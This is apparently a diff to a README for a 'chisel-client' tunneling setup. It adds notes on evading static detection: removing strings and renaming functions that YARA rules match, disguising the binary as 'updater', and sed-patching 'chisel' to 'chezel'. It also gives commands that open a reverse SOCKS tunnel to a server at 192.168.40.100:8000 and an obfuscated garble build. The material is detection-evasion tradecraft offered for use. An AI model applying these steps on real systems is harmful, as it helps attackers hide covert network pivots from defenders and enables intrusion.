@@ -1,19 +1,37 @@
 # chisel-client 
 
+10 minutes of source code review goes a long way. 
+
+Static detection bypasses: 
+
+- Remove chisel server-side code 
+- Remove hardcoded strings  
+- Change/remove printf strings 
+- Change function names detected by yara rules  
+
+
 ```
 # client 
 GOOS=linux GOARCH=amd64 go build -o updater
 sed -i 's/chisel/chezel/g' updater
+sed -i 's/CHISEL/CHEZEL/g' updater
 
 # Server 
 wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
 gzip -d chisel_1.10.1_linux_amd64.gz
 sed -i 's/chisel/chezel/g' chisel_1.10.1_linux_amd64
+chmod +x ./chisel_1.10.1_linux_amd64
 
 # Test 
 chmod +x updater 
 ./updater client 192.168.40.100:8000 R:socks
 ./chisel_1.10.1_linux_amd64 server -p 8000 --reverse --socks5
+
+# Automatic Obfuscators - not recommended, but it helps (not really tho) 
+export GARBLE_EXPERIMENTAL_CONTROLFLOW=1
+garble -tiny -literals -seed=random build -ldflags="-s -w -buildid= -X main.debug=false -X main.version= -X main.commit= -X main.date=" -trimpath -o garbleoutput .
+sed -i 's/chisel/chezel/g' garbleoutput
+sed -i 's/CHISEL/CHEZEL/g' garbleoutput
 ```
 
 # Chisel
